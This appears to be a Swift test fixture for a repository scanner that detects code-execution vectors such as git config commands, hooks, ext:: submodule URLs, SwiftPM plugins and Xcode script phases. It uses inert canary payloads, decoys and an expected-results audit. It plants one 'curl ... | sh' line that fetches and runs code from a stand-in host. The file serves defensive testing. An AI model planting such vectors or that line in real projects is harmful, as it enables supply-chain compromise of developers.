/// A repository that exercises every execution vector this library knows,
/// plus decoys that must NOT be reported.
///
/// Every payload is inert: it would only `touch /tmp/redteam-<vector>`, and it
/// is never executed — the fixture lives in memory and is only ever scanned.
/// The canary file names make it obvious, in any log, which vector fired.
public enum RedTeamFixture {
    /// The revision `Package.resolved` pins `swift-syntax` at. The demo app's
    /// policy allow-lists exactly this pin, to show allow-listing shrinking the
    /// surface a human has to approve.
    public static let swiftSyntaxRevision = "0687f71944021d616d34d922343dcef086855920"

    public static let gitConfig = """
    [core]
    \trepositoryformatversion = 0
    \tbare = false
    \tfsmonitor = "sh -c 'touch /tmp/redteam-fsmonitor'"
    \thooksPath = .githooks
    \tpager = less -R ; a comment that must not become part of the value
    [Diff "img"]
    \ttextconv = sh -c 'touch /tmp/redteam-textconv' \\
    \t  && cat
    [filter "lfsx"]
    \tsmudge = sh -c 'touch /tmp/redteam-smudge'
    \tclean = cat
    [include]
    \tpath = ../shared.gitconfig
    [alias]
    \tst = !sh -c 'touch /tmp/redteam-alias'
    \tlg = log --oneline
    [protocol "ext"]
    \tallow = always
    [remote "origin"]
    \turl = https://github.com/example/app.git
    \tfetch = +refs/heads/*:refs/remotes/origin/*
    """

    public static let packageManifest = """
    // swift-tools-version: 5.9
    import PackageDescription
    import Foundation
    import CompilerPluginSupport  // decoy: the standard macro-package import is not a side effect
    import Darwin

    // Decoy: commented-out code is not a plugin.
    // .plugin(name: "Ghost", capability: .buildTool())
    /* Decoy, nested: /* .macro(name: "Ghost") */ still a comment */

    let decoy = "Process(\\"not a call\\") .plugin(name: \\"Ghost\\", capability: .buildTool())"
    // A bare regex holding a lone quote must not swallow the rest of the line.
    let quote = /"/; let cwd = FileManager.default.currentDirectoryPath
    let ratio = 10 / 2 // division is not a regex
    let env = ProcessInfo.processInfo.environment["CI"] != nil

    let package = Package(
        name: "App",
        dependencies: [
            .package(url: "https://github.com/swiftlang/swift-syntax.git", from: "600.0.0"),
            .package(url: "https://github.com/example/codegen-tools", branch: "main"),
            .package(id: "acme.telemetry", from: "1.0.0"),
            .package(path: "../SharedKit"),
        ],
        targets: [
            .macro(name: "AppMacros", dependencies: [.product(name: "SwiftSyntaxMacros", package: "swift-syntax")]),
            .plugin(name: "GenerateStrings", capability: .buildTool()),
            .plugin(name: "Format", capability: .command(intent: .sourceCodeFormatting(), permissions: [.writeToPackageDirectory(reason: "fmt")])),
            .target(
                name: "App",
                dependencies: ["AppMacros"],
                swiftSettings: [.unsafeFlags(["-Xfrontend", "-load-plugin-executable"])],
                plugins: [.plugin(name: "Codegen", package: "codegen-tools")]
            ),
            .binaryTarget(name: "Analytics", url: "https://example.com/Analytics.xcframework.zip", checksum: "abc123"),
            .plugin (name: "SpacedLint", capability: .buildTool()),  // a space before "(" is legal Swift
        ]
    )
    """

    public static let versionSpecificManifest = """
    // swift-tools-version: 6.0
    // SwiftPM 6 picks this file over Package.swift.
    import PackageDescription
    let package = Package(name: "App", targets: [.target(name: "App")])
    """

    public static let packageResolved = """
    {
      "originHash" : "5f0c6b0a",
      "pins" : [
        {
          "identity" : "swift-syntax",
          "kind" : "remoteSourceControl",
          "location" : "https://github.com/swiftlang/swift-syntax.git",
          "state" : { "revision" : "\(swiftSyntaxRevision)", "version" : "600.0.1" }
        },
        {
          "identity" : "swift-format-plugin",
          "kind" : "remoteSourceControl",
          "location" : "https://github.com/example/swift-format-plugin.git",
          "state" : { "revision" : "1111111111111111111111111111111111111111", "version" : "1.2.0" }
        }
      ],
      "version" : 3
    }
    """

    public static let originalScript = "\\\"${SRCROOT}/scripts/lint.sh\\\"\\ntouch /tmp/redteam-script-phase\\n"

    public static func projectFile(script: String = originalScript) -> String {
        """
        // !$*UTF8*$!
        {
        \tarchiveVersion = 1;
        \tobjectVersion = 60;
        \tobjects = {
        \t\tAA0000000000000000000001 /* Project object */ = {isa = PBXProject; targets = (AA0000000000000000000002); };
        \t\tAA0000000000000000000002 /* App */ = {isa = PBXNativeTarget; name = App; buildPhases = (AA0000000000000000000003); buildRules = (AA0000000000000000000004); };
        \t\tAA0000000000000000000003 /* Lint */ = {
        \t\t\tisa = PBXShellScriptBuildPhase;
        \t\t\tname = Lint;
        \t\t\tshellPath = /bin/sh;
        \t\t\tshellScript = "\(script)";
        \t\t};
        \t\tAA0000000000000000000004 = {isa = PBXBuildRule; filePatterns = "*.proto"; script = "touch /tmp/redteam-build-rule"; };
        \t\tAA0000000000000000000005 /* Tool */ = {isa = PBXLegacyTarget; name = Tool; buildToolPath = /usr/bin/make; buildArgumentsString = "$(ACTION)"; };
        \t\tAA0000000000000000000006 /* Decoy: a comment saying isa = PBXShellScriptBuildPhase; is not one */ = {isa = PBXGroup; children = (); };
        \t\tAA0000000000000000000008 /* Debug */ = {isa = XCBuildConfiguration; name = Debug; buildSettings = {SWIFT_VERSION = 6.0; OTHER_SWIFT_FLAGS = ("$(inherited)", "-load-plugin-executable", "/tmp/redteam-plugin#RedTeam"); }; };
        \t\tAA0000000000000000000009 /* Release */ = {isa = XCBuildConfiguration; name = Release; buildSettings = {OTHER_SWIFT_FLAGS = "-warnings-as-errors"; }; };
        \t\tAA0000000000000000000007 = {isa = XCRemoteSwiftPackageReference; repositoryURL = "https://github.com/example/telemetry-kit.git"; requirement = {kind = upToNextMajorVersion; minimumVersion = 2.0.0; }; };
        \t};
        \trootObject = AA0000000000000000000001;
        }
        """
    }

    public static let scheme = """
    <?xml version="1.0" encoding="UTF-8"?>
    <Scheme LastUpgradeVersion = "1600" version = "1.7">
       <BuildAction parallelizeBuildables = "YES">
          <PreActions>
             <ExecutionAction ActionType = "Xcode.IDEStandardExecutionActionsCore.ExecutionActionType.ShellScriptAction">
                <ActionContent title = "Run Script" scriptText = "touch /tmp/redteam-scheme &amp;&amp; echo &quot;pre&quot;&#10;">
                </ActionContent>
             </ExecutionAction>
          </PreActions>
       </BuildAction>
    </Scheme>
    """

    /// The full red-team repository.
    public static var repo: InMemoryRepo {
        InMemoryRepo(files: [
            ".git/config": gitConfig,
            ".git/HEAD": "ref: refs/heads/main\n",
            ".git/hooks/post-checkout": "#!/bin/sh\ntouch /tmp/redteam-post-checkout\n",
            ".git/hooks/pre-commit.sample": "#!/bin/sh\n# decoy: .sample hooks never run\n",
            ".githooks/pre-commit": "#!/bin/sh\ntouch /tmp/redteam-hookspath\n",
            ".gitattributes": "*.png diff=img\n*.dat filter=lfsx\n*.swift diff=swift\n# *.bin filter=commented-out\n",
            ".gitmodules": "[submodule \"vendor\"]\n\tpath = vendor\n\turl = ext::sh -c touch% /tmp/redteam-submodule\n",
            "Package.swift": packageManifest,
            "Package@swift-6.0.swift": versionSpecificManifest,
            "Package.resolved": packageResolved,
            "App.xcodeproj/project.pbxproj": projectFile(),
            "App.xcodeproj/xcshareddata/xcschemes/App.xcscheme": scheme,
            "Sources/App/App.swift": "// .plugin(name: \"NotAManifest\", capability: .buildTool()) — not a manifest, never scanned\n",
            "README.md": "# App\n",
            "Config/Base.xcconfig": "// Decoy below: an ordinary flag is not a vector.\nSWIFT_EXEC = /tmp/redteam-swift-exec\nOTHER_SWIFT_FLAGS = -warnings-as-errors\n",
        ])
    }

    /// The same repository after an upstream commit edits the Lint script phase
    /// — the "approve, then `git pull`" scenario.
    public static func repoAfterUpstreamEdit(_ base: InMemoryRepo) -> InMemoryRepo {
        var repo = base
        repo.write(projectFile(script: originalScript + "curl -s https://example.invalid/x | sh # redteam-upstream\\n"),
                   to: "App.xcodeproj/project.pbxproj")
        return repo
    }

    public struct Expected: Hashable, Sendable, CustomStringConvertible {
        public let vectorClass: VectorClass
        public let subject: String
        public var description: String { "\(vectorClass.rawValue) `\(subject)`" }
    }

    /// Every vector the fixture plants — recall is measured against this.
    public static let expected: Set<Expected> = [
        .init(vectorClass: .gitConfigCommand, subject: "core.fsmonitor"),
        .init(vectorClass: .gitHooksPathRedirect, subject: "core.hookspath"),
        .init(vectorClass: .gitConfigCommand, subject: "core.pager"),
        .init(vectorClass: .gitConfigCommand, subject: "diff.img.textconv"),
        .init(vectorClass: .gitConfigCommand, subject: "filter.lfsx.smudge"),
        .init(vectorClass: .gitConfigCommand, subject: "filter.lfsx.clean"),
        .init(vectorClass: .gitConfigInclude, subject: "include.path"),
        .init(vectorClass: .gitConfigCommand, subject: "alias.st"),
        .init(vectorClass: .gitConfigCommand, subject: "protocol.ext.allow"),
        .init(vectorClass: .gitHook, subject: "post-checkout"),
        .init(vectorClass: .gitHook, subject: "pre-commit"),
        .init(vectorClass: .gitAttributeDriverDefined, subject: "diff=img"),
        .init(vectorClass: .gitAttributeDriverDefined, subject: "filter=lfsx"),
        .init(vectorClass: .gitAttributeDriverLatent, subject: "diff=swift"),
        .init(vectorClass: .gitSubmoduleInjection, subject: "submodule.vendor.url"),
        .init(vectorClass: .manifestEvaluation, subject: "Package.swift"),
        .init(vectorClass: .manifestEvaluation, subject: "Package@swift-6.0.swift"),
        .init(vectorClass: .versionSpecificManifest, subject: "Package@swift-6.0.swift"),
        .init(vectorClass: .manifestSideEffect, subject: "ProcessInfo"),
        .init(vectorClass: .manifestSideEffect, subject: "import Darwin"),
        .init(vectorClass: .macroTarget, subject: "AppMacros"),
        .init(vectorClass: .buildToolPlugin, subject: "GenerateStrings"),
        .init(vectorClass: .buildToolPlugin, subject: "Codegen (from codegen-tools)"),
        .init(vectorClass: .commandPlugin, subject: "Format"),
        .init(vectorClass: .unsafeFlags, subject: "-Xfrontend -load-plugin-executable"),
        .init(vectorClass: .binaryTarget, subject: "Analytics"),
        .init(vectorClass: .localPackage, subject: "../SharedKit"),
        .init(vectorClass: .remotePackage, subject: "swift-syntax"),
        .init(vectorClass: .remotePackage, subject: "codegen-tools"),
        .init(vectorClass: .remotePackage, subject: "swift-format-plugin"),
        .init(vectorClass: .remotePackage, subject: "telemetry-kit"),
        .init(vectorClass: .scriptPhase, subject: "Lint [AA0000000000000000000003]"),
        .init(vectorClass: .buildRule, subject: "*.proto [AA0000000000000000000004]"),
        .init(vectorClass: .legacyTarget, subject: "Tool [AA0000000000000000000005]"),
        .init(vectorClass: .schemeAction, subject: "App.xcscheme action #1"),
        .init(vectorClass: .buildSetting, subject: "OTHER_SWIFT_FLAGS (Debug) [AA0000000000000000000008]"),
        .init(vectorClass: .buildSetting, subject: "SWIFT_EXEC (Base.xcconfig:2)"),
        .init(vectorClass: .remotePackage, subject: "acme.telemetry"),
        .init(vectorClass: .buildToolPlugin, subject: "SpacedLint"),
        .init(vectorClass: .manifestSideEffect, subject: "FileManager"),
    ]

    public struct Audit: Sendable, Equatable {
        /// Planted vectors the scanner failed to report (recall failures).
        public let missing: Set<Expected>
        /// Reported vectors that were not planted — decoys that fooled it (precision failures).
        public let unexpected: Set<Expected>
        public var passed: Bool { missing.isEmpty && unexpected.isEmpty }
    }

    /// Score an inventory of `repo` against `expected`.
    public static func audit(_ inventory: Inventory) -> Audit {
        let found = Set(inventory.vectors.map { Expected(vectorClass: $0.vectorClass, subject: $0.subject) })
        return Audit(missing: expected.subtracting(found), unexpected: found.subtracting(expected))
    }
}
